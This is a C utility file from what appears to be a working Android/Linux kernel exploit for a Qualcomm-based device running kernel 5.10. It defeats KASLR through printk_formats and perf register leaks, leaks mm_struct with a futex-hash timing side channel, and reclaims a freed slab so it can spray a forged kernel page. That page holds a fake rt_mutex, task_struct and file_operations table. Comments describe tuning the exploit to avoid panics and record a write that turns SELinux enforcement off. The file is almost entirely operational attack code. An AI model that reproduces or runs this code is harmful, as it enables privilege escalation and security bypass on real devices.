/*
 * util.c — KASLR leak (printk_formats), address math, KernelSnitch mm_struct
 * leak, order-3 slab reclaim + SKB spray of the fake kernel page, perf task
 * leak, slab drain.
 */
#include "common.h"

uint64_t kaslr_base = KIMAGE_TEXT_BASE;
uint64_t kaslr_slide = 0;
int kaslr_done = 0;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;

/* ===================== basic helpers ===================== */

void pin_to_core(int core) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(core, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

void disable_rseq_for_thread(void) { }

int env_flag(const char *name, int def) {
  char *v = getenv(name);
  if (!v) return def;
  return atoi(v);
}

int env_int_range(const char *name, int def, int min, int max) {
  char *v = getenv(name);
  if (!v) return def;
  int val = (int)strtol(v, NULL, 0);
  if (val < min) return min;
  if (val > max) return max;
  return val;
}

uintptr_t env_hex(const char *name, uintptr_t def) {
  char *v = getenv(name);
  if (!v) return def;
  return (uintptr_t)strtoull(v, NULL, 0);
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3; /* SCHED_BATCH: nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

/* ===================== address math ===================== */

/* direct-map (linear) alias of a kernel *image* address. KASLR is virtual
 * only, so this is slide-invariant. */
static uint64_t phys_load_override = 0;   /* 0 = use P0_KERNEL_PHYS_LOAD */
uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uint64_t load = phys_load_override ? phys_load_override : P0_KERNEL_PHYS_LOAD;
  uintptr_t phys = load + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

void set_kernel_phys_load(uint64_t v) { phys_load_override = v; }

/* v9.40: the RV101 (Qualcomm QCM4290) kernel image lives at a HIGH physical
 * address (kimage_voffset == KASLR slide, NOT VA-PA), so the direct-map alias
 * p0_data_alias() maps to the WRONG physical page. The rb_erase write is a
 * plain kernel VA store, so it must target the RUNTIME KERNEL VA (text_addr),
 * not the direct-map alias. Verified: --write1 (data_addr) -> no flip;
 * --write1-text (text_addr) -> enforce flips to 0 (Permissive). */
uintptr_t data_addr(uintptr_t image_addr) { return text_addr(image_addr); }

uintptr_t text_addr(uintptr_t image_addr) {
  if (!kaslr_done) return image_addr;
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

/* ===================== KASLR leak via printk_formats =====================
 * /sys/kernel/tracing/printk_formats is world-readable (shell gid=readtracefs)
 * and dumps "<kernel-va> : \"<string>\"" for every %p format pointer. */

struct pf_anchor {
  const char *str;
  uint64_t off;
};

static const struct pf_anchor pf_anchors[] = {
  { "Rescheduling interrupts", PF_STR_RESCHED_OFF },
  { "Function call interrupts", PF_STR_FUNCALL_OFF },
};

int leak_kaslr(void) {
  FILE *f = fopen("/sys/kernel/tracing/printk_formats", "r");
  if (!f) {
    pr_error("cannot open printk_formats errno=%d\n", errno);
    return 0;
  }
  char line[512];
  int votes = 0;
  uint64_t slide_sum = 0;
  while (fgets(line, sizeof(line), f)) {
    char *colon = strstr(line, " : ");
    if (!colon) continue;
    *colon = 0;
    char *str_beg = colon + 3;
    char *str_end = str_beg + strlen(str_beg) - 1;
    while (str_end > str_beg && (*str_end == '\n' || *str_end == '\r'))
      *str_end-- = 0;
    if (*str_beg != '"') continue;
    char *content = str_beg + 1;
    char *close_q = strrchr(content, '"');
    if (close_q) *close_q = 0;

    uint64_t va = strtoull(line, NULL, 16);
    for (size_t i = 0; i < sizeof(pf_anchors) / sizeof(pf_anchors[0]); i++) {
      if (strcmp(content, pf_anchors[i].str) == 0) {
        uint64_t link = KIMAGE_TEXT_BASE + pf_anchors[i].off;
        uint64_t slide = va - link;
        if ((slide & 0x1fffffULL) == 0) { /* 2MB KASLR granularity */
          slide_sum += slide;
          votes++;
          pr_info("printk_formats: \"%s\" -> 0x%016llx slide=0x%016llx\n",
                  content, (unsigned long long)va, (unsigned long long)slide);
        }
      }
    }
  }
  fclose(f);
  if (!votes) {
    pr_error("no printk_formats anchors matched\n");
    return 0;
  }
  kaslr_slide = slide_sum / votes;
  kaslr_base = KIMAGE_TEXT_BASE + kaslr_slide;
  kaslr_done = 1;
  pr_success("KASLR: slide=0x%016llx base=0x%016llx (%d anchors)\n",
             (unsigned long long)kaslr_slide,
             (unsigned long long)kaslr_base, votes);
  return 1;
}

/* ===================== perf task leak ===================== */

uint64_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  long fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d (%s)\n", errno, strerror(errno));
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_warning("perf mmap errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uint64_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uint64_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task leak: 0x%016llx (%d/%d votes)\n",
          (unsigned long long)best, best_cnt, nc);
  return best;
}

/* ===================== KernelSnitch (mm_struct leak) =====================
 * 5.10 futex key: { page-aligned uaddr, mm } hashed with jhash2(4 words,
 * initval = uaddr & 0xfff), bucket = hash & (futex_hashsize-1),
 * futex_hashsize = 256 * num_possible_cpus() (1024 here).
 */

static inline uint32_t ks_rol32(uint32_t word, unsigned int shift) {
  return (word << (shift & 31)) | (word >> ((-shift) & 31));
}

static inline uint32_t jhash2(const uint32_t *k, uint32_t length, uint32_t initval) {
  uint32_t a, b, c;
  a = b = c = 0xdeadbeef + ((uint32_t)length << 2) + initval;
  while (length > 3) {
    a += k[0]; b += k[1]; c += k[2];
    a -= c; a ^= ks_rol32(c, 4);  c += b;
    b -= a; b ^= ks_rol32(a, 6);  a += c;
    c -= b; c ^= ks_rol32(b, 8);  b += a;
    a -= c; a ^= ks_rol32(c, 16); c += b;
    b -= a; b ^= ks_rol32(a, 19); a += c;
    c -= b; c ^= ks_rol32(b, 4);  b += a;
    length -= 3;
    k += 3;
  }
  switch (length) {
    case 3: c += k[2]; /* fallthrough */
    case 2: b += k[1]; /* fallthrough */
    case 1:
      a += k[0];
      c ^= b; c -= ks_rol32(b, 14);
      a ^= c; a -= ks_rol32(c, 11);
      b ^= a; b -= ks_rol32(a, 25);
      c ^= b; c -= ks_rol32(b, 16);
      a ^= c; a -= ks_rol32(c, 4);
      b ^= a; b -= ks_rol32(a, 14);
      c ^= b; c -= ks_rol32(b, 24);
      break;
    case 0: break;
  }
  return c;
}

#define KS_FUTEX_HASHSIZE 1024

/* RV101 5.10: private futex key = { mm(8), page-aligned uaddr(8) };
 * hash = jhash2(mm_lo, mm_hi, addr_lo, addr_hi, uaddr & 0xfff);
 * bucket = hash & (hashsize-1).
 * (verified in get_futex_key/hash_futex disasm: the FUTEX_WAIT_PRIVATE path
 * stores {mm, addr} with NO offset flags; FUT_OFF_MMSHARED only applies to
 * shared futexes on anon mappings) */
static uint32_t ks_futex_hash_raw(uintptr_t user_addr, uintptr_t mm) {
  uint32_t key[4];
  uintptr_t page = user_addr & ~0xfffULL;
  key[0] = (uint32_t)(mm & 0xffffffff);
  key[1] = (uint32_t)(mm >> 32);
  key[2] = (uint32_t)(page & 0xffffffff);
  key[3] = (uint32_t)(page >> 32);
  return jhash2(key, 4, (uint32_t)(user_addr & 0xfff));
}

static uint32_t ks_futex_hash_bucketed(uintptr_t user_addr, uintptr_t mm, uint32_t hashsize) {
  return ks_futex_hash_raw(user_addr, mm) & (hashsize - 1);
}

struct ks_shared {
  volatile size_t mm_struct;
  volatile size_t found;
  volatile size_t collisions;
  volatile unsigned char *futexes;
  volatile size_t *futex_addrs;
  volatile size_t *times;
  volatile size_t total_futexes;
  volatile size_t thread_cnt;
  volatile int mte_enabled;
  volatile size_t mm_struct_sz;
  volatile size_t futex_hash_table_size;
  volatile int collisions_done;
  volatile size_t single_matches;
  volatile unsigned char inc_futex[4096];
};

#define KS_FUTEX_SZ (64ULL << 30)
#define KS_FUTEX_MMAP_SZ (1ULL << 30)
#define APPENDED_FUTEXES 4096
#define KS_MULTIPLE 4
#define KS_REPEAT 128
#define KS_AVERAGE 8
#define KS_ID 128

static inline uint64_t rdtsc_begin(void) {
  uint64_t v;
  __asm__ volatile("isb; mrs %0, cntvct_el0" : "=r"(v));
  return v;
}

static struct timespec ks_t0;
static double ks_now_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ks_t0.tv_sec) * 1000.0 + (now.tv_nsec - ks_t0.tv_nsec) / 1e6;
}

static int ks_cmp_u64(const void *a, const void *b) {
  return (*(const size_t *)a > *(const size_t *)b) - (*(const size_t *)a < *(const size_t *)b);
}

static size_t ks_measure(struct ks_shared *ks, size_t futex_addr) {
  size_t times[KS_REPEAT];
  for (int l = 0; l < KS_REPEAT; l++) {
    sched_yield();
    uint64_t t0 = rdtsc_begin();
    syscall(SYS_futex, (unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
    uint64_t t1 = rdtsc_begin();
    times[l] = (size_t)(t1 - t0);
  }
  qsort(times, KS_REPEAT, sizeof(size_t), ks_cmp_u64);
  size_t sum = 0;
  for (int l = 0; l < KS_AVERAGE; l++) sum += times[l];
  return sum / KS_AVERAGE;
}

struct ks_inc_arg { struct ks_shared *ks; size_t id; };
static void *ks_do_increase(void *arg) {
  struct ks_inc_arg *a = arg;
  syscall(SYS_futex, (unsigned int *)&a->ks->inc_futex[a->id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
  free(a);
  return NULL;
}

static void ks_increase(struct ks_shared *ks, size_t id, size_t amount) {
  pthread_t tid;
  int fail = 0, first_err = 0;
  for (size_t i = 0; i < amount; i++) {
    struct ks_inc_arg *a = calloc(1, sizeof(*a));
    if (!a) { if (!fail) first_err = errno; fail++; continue; }
    a->id = id; a->ks = ks;
    errno = 0;
    int r = pthread_create(&tid, NULL, ks_do_increase, a);
    if (r != 0) { if (!fail) first_err = r; fail++; free(a); }
  }
  if (fail) pr_info("kernelsnitch: ks_increase %zu threads, %d failed (first err=%d)\n",
                    amount, fail, first_err);
  for (int i = 0; i < 2; i++) sched_yield();
}

/* runs INSIDE the leak child (kernel-side timing with the child's mm) */
static void *ks_find_collisions_main(void *arg) {
  struct ks_shared *ks = arg;
  size_t wanted = ks->collisions - 1;
  size_t count = 0;
  size_t approx = ks_measure(ks, (size_t)&ks->futexes[0]);
  size_t approx2 = ks_measure(ks, (size_t)&ks->futexes[4096 + 8]);
  if (approx2 < approx) approx = approx2;
  size_t threshold = approx * KERNELSNITCH_THRESHOLD_MULT;
  pr_info("kernelsnitch: baseline=%zu threshold=%zu\n", approx, threshold);

  ks_increase(ks, KS_ID, APPENDED_FUTEXES);
  usleep(200000);
  {
    FILE *st = fopen("/proc/self/status", "r");
    char line[128];
    if (st) {
      while (fgets(line, sizeof(line), st))
        if (!strncmp(line, "Threads:", 8)) { fputs(line, stderr); break; }
      fclose(st);
    }
  }

  ks->futex_addrs[0] = (size_t)&ks->inc_futex[KS_ID];
  size_t slow[8] = {0};
  for (size_t i = 2; i < ks->total_futexes && count < wanted; i++) {
    size_t id = (i * 4096) | ((i * 8) % 4096);
    if (id >= KS_FUTEX_SZ) break;
    size_t fa = (size_t)&ks->futexes[id];
    size_t t = ks_measure(ks, fa);
    ks->times[i] = t;
    for (int s = 0; s < 8; s++) {
      if (t > slow[s]) {
        for (int m = 7; m > s; m--) slow[m] = slow[m - 1];
        slow[s] = t;
        break;
      }
    }
    if (t > threshold) {
      count++;
      ks->futex_addrs[count] = fa;
      pr_info("  collision[%zu]: %016zx (t=%zu, ratio=%zu)\n", count, fa, t,
              t / (approx ? approx : 1));
    }
  }
  pr_info("kernelsnitch: top times: %zu %zu %zu %zu %zu %zu %zu %zu\n",
          slow[0], slow[1], slow[2], slow[3], slow[4], slow[5], slow[6], slow[7]);
  ks->collisions_done = (count == wanted);
  pr_info("kernelsnitch child: %zu/%zu collisions\n", count, wanted);
  return NULL;
}

struct ks_range { struct ks_shared *ks; size_t start, end; };
static void *ks_bruteforce_main(void *arg) {
  struct ks_range *r = arg;
  struct ks_shared *ks = r->ks;
  size_t mm_slab_sz = (size_t)4096 << MM_ORDER;
  uint32_t hashsize = (uint32_t)ks->futex_hash_table_size;
  for (size_t slab = r->start; slab < r->end && !ks->found; slab += mm_slab_sz) {
    for (size_t off = 0; off < mm_slab_sz && !ks->found; off += ks->mm_struct_sz) {
      uintptr_t cand = slab + off;
      /* single-filter diagnostic: count candidates that satisfy just the
       * first equality (expected ~range/1024 if the hash is correct) */
      if (ks_futex_hash_bucketed(ks->futex_addrs[0], cand, hashsize) ==
          ks_futex_hash_bucketed(ks->futex_addrs[1], cand, hashsize)) {
        __sync_fetch_and_add(&ks->single_matches, 1);
        int match = 1;
        for (int i = 2; i < (int)ks->collisions; i++) {
          if (ks_futex_hash_bucketed(ks->futex_addrs[0], cand, hashsize) !=
              ks_futex_hash_bucketed(ks->futex_addrs[i], cand, hashsize)) {
            match = 0;
            break;
          }
        }
        if (match) {
          ks->mm_struct = cand;
          ks->found = 1;
        }
      }
    }
  }
  return NULL;
}

/* mm_struct sizes to try (5.10 layout varies with config) */
static const size_t ks_mm_sizes[] = { 0x3c0, 0x400, 0x380, 0x440, 0x480 };
/* futex_hashsize = 256 * num_possible_cpus(); try common values */
static const size_t ks_hash_sizes[] = { 1024, 2048, 512, 4096 };

/* Runs in-process (must be the process whose mm_struct we want to leak). */
static uintptr_t kernelsnitch_leak_mm(void) {
  int cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
  struct ks_shared *ks = mmap(NULL, sizeof(*ks), PROT_READ | PROT_WRITE,
                              MAP_ANON | MAP_SHARED, -1, 0);
  if (ks == MAP_FAILED) return 0;
  ks->mm_struct = 0;
  ks->found = 0;
  ks->collisions = KSNITCH_COLLISIONS;
  ks->mte_enabled = 0;
  ks->mm_struct_sz = MM_STRUCT_SZ;
  ks->collisions_done = 0;
  ks->total_futexes = KS_FUTEX_HASHSIZE * ks->collisions * KS_MULTIPLE;
  ks->thread_cnt = (size_t)cpus * 2;
  ks->times = mmap(NULL, sizeof(size_t) * ks->total_futexes, PROT_READ | PROT_WRITE,
                   MAP_ANON | MAP_SHARED, -1, 0);
  ks->futex_addrs = mmap(NULL, sizeof(size_t) * (ks->collisions + 1),
                         PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
  ks->futexes = mmap(NULL, KS_FUTEX_SZ, PROT_NONE,
                     MAP_ANON | MAP_PRIVATE | MAP_NORESERVE, -1, 0);
  for (size_t addr = 0; addr < KS_FUTEX_SZ; addr += KS_FUTEX_MMAP_SZ)
    mmap((void *)((size_t)ks->futexes + addr), KS_FUTEX_MMAP_SZ,
         PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED | MAP_FIXED, -1, 0);

  clock_gettime(CLOCK_MONOTONIC, &ks_t0);

  /* collision finding uses current->mm — run it in this process */
  ks_find_collisions_main(ks);
  if (!ks->collisions_done) {
    pr_warning("kernelsnitch: collision finding failed\n");
    return 0;
  }

  /* bruteforce (pure C hash matching) over candidate linear-map ranges */
  struct scan_region {
    size_t start, end;
  };
  struct scan_region regions[] = {
    { 0xffff000000000000ULL, 0xffff000200000000ULL }, /* 48-bit linear, 8GB */
    { 0xffffff8000000000ULL, 0xffffff8100000000ULL }, /* 39-bit style, 4GB */
  };
  int nthreads = (int)ks->thread_cnt;
  pthread_t *tids = calloc(nthreads, sizeof(pthread_t));
  struct ks_range *ranges = calloc(nthreads, sizeof(struct ks_range));
  uintptr_t mm = 0;
  for (size_t hs = 0; hs < sizeof(ks_hash_sizes) / sizeof(ks_hash_sizes[0]) && !ks->found; hs++) {
    for (size_t s = 0; s < sizeof(ks_mm_sizes) / sizeof(ks_mm_sizes[0]) && !ks->found; s++) {
      ks->mm_struct_sz = ks_mm_sizes[s];
      ks->futex_hash_table_size = ks_hash_sizes[hs];
      ks->found = 0;
      ks->single_matches = 0;
      for (size_t reg = 0; reg < sizeof(regions) / sizeof(regions[0]) && !ks->found; reg++) {
        size_t total = regions[reg].end - regions[reg].start;
        size_t chunk = total / nthreads;
        for (int i = 0; i < nthreads; i++) {
          ranges[i].ks = ks;
          ranges[i].start = regions[reg].start + chunk * i;
          ranges[i].end = (i == nthreads - 1) ? regions[reg].end
                                              : regions[reg].start + chunk * (i + 1);
          pthread_create(&tids[i], NULL, ks_bruteforce_main, &ranges[i]);
        }
        for (int i = 0; i < nthreads; i++) pthread_join(tids[i], NULL);
      }
      pr_info("kernelsnitch: hashsize=%zu sz=0x%zx single_matches=%zu mm=%s\n",
              ks->futex_hash_table_size, ks->mm_struct_sz, ks->single_matches,
              ks->found ? "FOUND" : "-");
      if (ks->found) mm = ks->mm_struct;
    }
  }
  pr_info("kernelsnitch: elapsed %.0fms mm=%016zx\n", ks_now_ms(), mm);
  free(tids); free(ranges);
  return mm;
}

/* ===================== fake kernel page spray (v4 reclaim) =====================
 *
 * SLUB 5.10.209 facts that drive this design (verified in slub_5.10.209.c):
 *  - allocation slowpath POPS the per-CPU partial chain head
 *    (___slab_alloc new_slab:), and an empty chain page popped for
 *    allocation is phantom-dropped (get_freelist sets inuse=objects,
 *    frozen=0, page leaves all lists) -> any mm allocation between
 *    "leak slab empty" and the drain DESTROYS the leak slab.
 *  - put_cpu_partial(page, drain=1) triggers unfreeze_partials when the
 *    chain's cumulative pobjects > cpu_partial (13 for mm_struct).
 *    Each 1st-free of a full slab adds exactly 1 pobject; subsequent
 *    frees of the same (frozen) slab are FREE_FROZEN fastpath.
 *  - unfreeze_partials walks the chain head->tail; empty pages are
 *    discarded only if n->nr_partial >= min_partial(5) at that moment;
 *    the discard list is LIFO so the LAST-walked (tail) page is freed
 *    FIRST -> buddy LIFO head.
 *  => the drain must be triggered by PURE FREES (keeper kills) with the
 *     leak slab at the chain tail and >= 13 non-empty pages above it.
 *     No anchors, no re-exec, no flood.
 */

#define MM_OBJS_PER_SLAB (ORDER2_SIZE / MM_STRUCT_SZ)

static unsigned char *skb_buf;
static unsigned char *skb_buf_pristine;
static int skb_send_size;
static int skb_sv[SKB_RECLAIM_SENDS][2];
static int skb_vehicles_used;
static pid_t *v4_keepers;
static int v4_keeper_cnt;

static void debug_pagetype(const char *tag) {
  FILE *f = fopen("/proc/pagetypeinfo", "r");
  if (!f) return;
  char line[512];
  int infree = 0;
  while (fgets(line, sizeof(line), f)) {
    if (!infree) {
      if (strstr(line, "Free pages count per migrate type at order")) infree = 1;
      continue;
    }
    char t[32];
    int n[11];
    if (sscanf(line, "Node 0, zone DMA, type %31s %d %d %d %d %d %d %d %d %d %d %d",
               t, &n[0], &n[1], &n[2], &n[3], &n[4], &n[5], &n[6], &n[7], &n[8],
               &n[9], &n[10]) == 12) {
      if (!strcmp(t, "Unmovable"))
        pr_info("[%s] Unmovable o0=%d o1=%d o2=%d o3=%d o4=%d o5=%d o6=%d o7=%d "
                "o8=%d o9=%d o10=%d\n",
                tag, n[0], n[1], n[2], n[3], n[4], n[5], n[6], n[7], n[8], n[9], n[10]);
    }
  }
  fclose(f);
}

/* returns the Unmovable order-2 count (the 16KB buddy block pool the v9
 * reclaim works in), -1 on read error. Prints the whole row when
 * GL_DEBUG_DRAIN is set. */
static int debug_pagetype_o2(const char *tag) {
  FILE *f = fopen("/proc/pagetypeinfo", "r");
  if (!f) return -1;
  char line[512];
  int infree = 0, o2 = -1;
  while (fgets(line, sizeof(line), f)) {
    if (!infree) {
      if (strstr(line, "Free pages count per migrate type at order")) infree = 1;
      continue;
    }
    char t[32];
    int n[11];
    if (sscanf(line, "Node 0, zone DMA, type %31s %d %d %d %d %d %d %d %d %d %d %d",
               t, &n[0], &n[1], &n[2], &n[3], &n[4], &n[5], &n[6], &n[7], &n[8],
               &n[9], &n[10]) == 12) {
      if (!strcmp(t, "Unmovable")) { o2 = n[2]; break; }
    }
  }
  fclose(f);
  if (env_flag("GL_DEBUG_DRAIN", 0))
    pr_info("[%s] Unmovable o2=%d\n", tag, o2);
  return o2;
}

pid_t clone_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) _exit(0);
    pin_to_core(CORE);
    for (;;) pause();
  }
  return child;
}

pid_t clone_leak_child(void *(*fn)(void *), void *arg) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    fn(arg);
    _exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return open(path, O_RDONLY);
}

void kill_child(pid_t child) {
  if (child <= 0) return;
  kill(child, SIGKILL);
  waitpid(child, NULL, 0);
}

static void put32p(unsigned char *p, size_t off, uint32_t v) {
  memcpy(p + off, &v, 4);
}
static void put64p(unsigned char *p, size_t off, uint64_t v) {
  memcpy(p + off, &v, 8);
}

/* v9.20: the RV101 unix-dgram SKB data starts at block+0 (proven by the
 * run 32/33/36 forensic: the walk's root-node write appeared at recv offset
 * LOCK_OFF+8 with zero pristine bytes). The v9.x "NET_SKB_PAD=64" assumption
 * desynced the payload from the walk's direct-map addresses by exactly 64
 * bytes — the walk saw an empty ownerless lock (hence usage=0x100 and no
 * leftmost update) while the erase write went to slab+SCRATCH_OFF unseen.
 * pad=0 re-aligns payload[OFF] <-> address page_base+OFF. */
static int skb_pad_off = 0;   /* data offset of skb payload within the slab */

static void prepare_skb_payload(uintptr_t base) {
  memset(skb_buf, 0, ORDER2_SIZE);
  skb_pad_off = env_int_range("GL_SKB_PAD", 0, 0, 256);
  int pad = skb_pad_off;
  uintptr_t pb = base + SKB_DATA_DELTA;

  /* The send() copies skb_buf into the skb data buffer, which starts at
   * slab + NET_SKB_PAD (64 on arm64) — NOT at block+0. The payload's
   * fields must therefore sit at skb_buf[OFF - pad] so they land at
   * slab[OFF] where the walk reads them via the direct map. The forged
   * ADDRESSES (pb + OFF) stay slab-relative and unchanged. */
  fake_lock = pb + LOCK_OFF;
  fake_w0 = pb + W0_OFF;
  fake_task = pb + FAKE_TASK_OFF;
  fake_fops = pb + FOPS_OFF;
  fake_parent = 0;
  fake_right = 0;
  fake_left = 0;

  /* page-view layout: the payload covers the whole page from block+0 */
  unsigned char *p = skb_buf;
  uintptr_t lock = pb + LOCK_OFF;
  uintptr_t w0 = pb + W0_OFF;
  uintptr_t ftask = pb + FAKE_TASK_OFF;

  /* fake rt_mutex */
  put32p(p, LOCK_OFF - pad + RTMUTEX_WAIT_LOCK_OFF, 0);
  put64p(p, LOCK_OFF - pad + RTMUTEX_WAITERS_OFF, w0);
  put64p(p, LOCK_OFF - pad + RTMUTEX_WAITERS_LM_OFF, w0);
  put64p(p, LOCK_OFF - pad + RTMUTEX_OWNER_OFF, env_flag("GL_NOOWNER", 0) ? 0 : (ftask | 1));

  /* fake top waiter (W0): tree_entry is the rb-tree ROOT -> parent_color
   * must be BLACK (= 1 in Linux rbtree, RB_BLACK=1/RB_RED=0) so
   * rb_insert_color stops immediately. A RED root (0) makes the insert
   * walk to the (NULL) grandparent -> NULL deref -> panic. */
  put64p(p, W0_OFF - pad + WAITER_TREE_ENTRY_OFF + 0x00, 1);
  put64p(p, W0_OFF - pad + WAITER_TREE_ENTRY_OFF + 0x08, 0);
  put64p(p, W0_OFF - pad + WAITER_TREE_ENTRY_OFF + 0x10, 0);
  put64p(p, W0_OFF - pad + WAITER_PI_TREE_ENTRY_OFF + 0x00, 0);
  put64p(p, W0_OFF - pad + WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
  put64p(p, W0_OFF - pad + WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
  put64p(p, W0_OFF - pad + WAITER_TASK_OFF, data_addr(INIT_TASK));
  put64p(p, W0_OFF - pad + WAITER_LOCK_OFF, lock);
  put32p(p, W0_OFF - pad + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
  put64p(p, W0_OFF - pad + WAITER_DEADLINE_OFF, 0);

  /* fake task_struct */
  put32p(p, FAKE_TASK_OFF - pad + TASK_USAGE_OFF, 0x100);
  put32p(p, FAKE_TASK_OFF - pad + TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32p(p, FAKE_TASK_OFF - pad + TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64p(p, FAKE_TASK_OFF - pad + TASK_DL_DEADLINE_OFF, 0);
  put32p(p, FAKE_TASK_OFF - pad + TASK_PI_LOCK_OFF, 0);
  put64p(p, FAKE_TASK_OFF - pad + TASK_PI_WAITERS_OFF, 0);      /* empty tree */
  put64p(p, FAKE_TASK_OFF - pad + TASK_PI_WAITERS_LM_OFF, 0);
  put64p(p, FAKE_TASK_OFF - pad + TASK_PI_TOP_TASK_OFF, data_addr(INIT_TASK));
  put64p(p, FAKE_TASK_OFF - pad + TASK_PI_BLOCKED_ON_OFF, 0);

  /* fake file_operations table (W2 FOPS route). RV101 is Clang kCFI: the
   * table must store the REAL ".cfi_jt" jump-table stubs, and configfs on
   * 5.10 uses .read/.write (NOT .read_iter/.write_iter). */
  put64p(p, FOPS_OFF - pad + FOPS_LLSEEK_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_NOOP_LLSEEK_OFF));
  /* v9.46: configfs_read_FILE (page@0x10) is the DEFAULT. Its
   * `file+0x18->+0x78->+0x50` prologue chain is CONDITIONAL (only taken when
   * needs_read_fill@0x50 != 0), so with needs_read_fill=0 our own read skips
   * the chain entirely and reaches simple_read_from_buffer(page=head) safely.
   * read_BIN_file (v9.45) derefs that chain UNCONDITIONALLY (file+0x18, +0x78,
   * +0x50 loads happen before the needs_read_fill branch), so our own pread
   * panics on the devtmpfs /dev/ashmem inode — the deterministic 3/3 panic at
   * "blob OK, about to pread". GL_BIN_FILE=1 restores the bin_file route. */
  uintptr_t read_jt = env_flag("GL_BIN_FILE", 0)
                          ? CFI_CONFIGFS_READ_BIN_OFF
                          : CFI_CONFIGFS_READ_FILE_OFF;
  put64p(p, FOPS_OFF - pad + FOPS_READ_OFF, text_addr(KIMAGE_TEXT_BASE + read_jt));
  put64p(p, FOPS_OFF - pad + FOPS_WRITE_OFF, 0);  /* write = NULL (no configfs write) */
  /* v9.41: read_iter = ashmem_read_iter (prevents the concurrent read_iter
   * NULL panic). The earlier 0/18 vs 2/15 (NULL) is likely small-sample
   * variance around the ~10-15% mode-5 rate, not a real read_iter effect. */
  put64p(p, FOPS_OFF - pad + FOPS_READ_ITER_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_ASHMEM_READ_ITER_OFF));
  put64p(p, FOPS_OFF - pad + FOPS_IOCTL_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_ASHMEM_IOCTL_OFF));
  put64p(p, FOPS_OFF - pad + FOPS_COMPAT_IOCTL_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_ASHMEM_COMPAT_IOCTL_OFF));
  put64p(p, FOPS_OFF - pad + FOPS_MMAP_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_ASHMEM_MMAP_OFF));
  put64p(p, FOPS_OFF - pad + FOPS_OPEN_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_ASHMEM_OPEN_OFF));
